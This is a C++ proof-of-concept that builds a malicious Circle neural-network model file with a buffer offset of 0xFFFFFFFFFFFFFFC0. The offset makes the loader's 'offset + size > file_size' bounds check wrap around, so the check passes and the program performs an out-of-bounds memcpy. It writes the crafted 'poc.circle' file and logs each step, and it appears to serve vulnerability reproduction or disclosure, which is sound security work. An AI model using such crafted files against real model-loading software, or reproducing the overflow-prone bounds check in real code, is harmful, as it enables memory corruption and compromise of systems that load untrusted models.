#include <cstdint>
#include <cstdio>
#include <cstring>
#include <cstdlib>
#include <cassert>
#include <vector>
#include <string>
#include <limits>
#include <fstream>

#include "sch_generated.h"

using namespace circle;

static std::vector<uint8_t> build_model(bool malicious) {
  flatbuffers::FlatBufferBuilder fbb(1024);

  auto opcode = CreateOperatorCode(fbb, 0, 0, 1, BuiltinOperator_ADD);
  std::vector<flatbuffers::Offset<OperatorCode>> opcodes = {opcode};

  std::vector<int32_t> shape = {1, 1, 1, 4};
  auto tensor = CreateTensorDirect(fbb, &shape, TensorType_FLOAT32,
                                   /*buffer=*/1, "w");
  std::vector<flatbuffers::Offset<Tensor>> tensors = {tensor};
  std::vector<int32_t> inputs = {};
  std::vector<int32_t> outputs = {};
  std::vector<flatbuffers::Offset<Operator>> operators = {};

  auto sg = CreateSubGraph(fbb,
                           fbb.CreateVector(tensors),
                           fbb.CreateVector(inputs),
                           fbb.CreateVector(outputs),
                           fbb.CreateVector(operators),
                           0);
  std::vector<flatbuffers::Offset<SubGraph>> subgraphs = {sg};

  auto empty_buf = CreateBuffer(fbb, 0, 0, 0);

  flatbuffers::Offset<Buffer> const_buf;
  if (malicious) {
    const_buf = CreateBuffer(fbb, 0,
                             /*offset=*/0xFFFFFFFFFFFFFFC0ULL,
                             /*size=*/0x40ULL);
  } else {
    const_buf = CreateBuffer(fbb, 0,
                             /*offset=*/4ULL,
                             /*size=*/0x10ULL);
  }
  std::vector<flatbuffers::Offset<Buffer>> buffers = {empty_buf, const_buf};

  auto model = CreateModel(fbb,
                           /*version=*/0,
                           fbb.CreateVector(opcodes),
                           fbb.CreateVector(subgraphs),
                           0,
                           fbb.CreateVector(buffers),
                           0, 0, 0);
  FinishModelBuffer(fbb, model);

  return std::vector<uint8_t>(fbb.GetBufferPointer(),
                              fbb.GetBufferPointer() + fbb.GetSize());
}

static const uint8_t *g_file_data = nullptr;
static uint64_t g_file_size = 0;

static const uint8_t *reader_file_data(uint64_t offset) {
  assert(g_file_data);
  assert(offset < g_file_size);
  return (g_file_data == nullptr) ? nullptr : g_file_data + offset;
}
static uint64_t reader_file_size() { return g_file_size; }

int main(int argc, char **argv) {
  bool malicious = true;
  if (argc > 1 && std::string(argv[1]) == "--benign") malicious = false;

  std::vector<uint8_t> bytes = build_model(malicious);

  const char *out = malicious ? "poc.circle" : "benign.circle";
  {
    std::ofstream f(out, std::ios::binary);
    f.write(reinterpret_cast<const char *>(bytes.data()), bytes.size());
  }
  fprintf(stderr, "[*] wrote %s (%zu bytes), mode=%s\n", out, bytes.size(),
          malicious ? "MALICIOUS" : "BENIGN");

  std::ifstream in(out, std::ios::binary | std::ios::ate);
  std::streamsize len = in.tellg();
  in.seekg(0);
  uint8_t *file_buf = new uint8_t[static_cast<size_t>(len)];
  in.read(reinterpret_cast<char *>(file_buf), len);

  g_file_data = file_buf;
  g_file_size = static_cast<uint64_t>(len);

  const circle::Model *circle_model = circle::GetModel(file_buf);
  fprintf(stderr, "[*] GetModel ok, version=%u, file_size=%llu\n",
          circle_model->version(),
          (unsigned long long)g_file_size);

  const auto subgraph = circle_model->subgraphs()->Get(0);
  const auto const_tensor = subgraph->tensors()->Get(0);

  const auto r_buffers = circle_model->buffers();
  const auto c_buffer = const_tensor->buffer();
  const auto r_buffer = r_buffers->Get(c_buffer);

  fprintf(stderr, "[*] const tensor buffer idx=%u offset=0x%llx size=0x%llx\n",
          c_buffer,
          (unsigned long long)r_buffer->offset(),
          (unsigned long long)r_buffer->size());

  std::vector<uint8_t> temp_buffer;

  if (r_buffer->offset() > 1) {
    if (r_buffer->size() >= std::numeric_limits<uint32_t>::max())
      throw std::runtime_error("CircleConst: Circle file with invalid extended Buffer.");
    uint32_t r_size = static_cast<uint32_t>(r_buffer->size());
    temp_buffer.resize(r_size + sizeof(uint32_t));
    uint8_t *t_data = temp_buffer.data();
    const uint8_t *f_data = reader_file_data(r_buffer->offset());
    if (f_data == nullptr) { assert(false); return 1; }
    memcpy(t_data, &r_size, sizeof(r_size));
    t_data = t_data + sizeof(r_size);
    if (r_buffer->offset() + r_buffer->size() > reader_file_size()) {
      fprintf(stderr, "[*] guard (offset+size > file_size) HIT -> would abort\n");
      assert(false);
      return 1;
    }
    fprintf(stderr, "[*] guard PASSED (offset+size=0x%llx), about to memcpy 0x%x bytes from f_data=%p (file_data=%p)\n",
            (unsigned long long)(r_buffer->offset() + r_buffer->size()),
            r_size, (const void *)f_data, (const void *)g_file_data);
    memcpy(t_data, f_data, r_buffer->size());
    fprintf(stderr, "[*] memcpy done (no crash), first byte=0x%02x\n", t_data[0]);
  }

  delete[] file_buf;
  return 0;
}
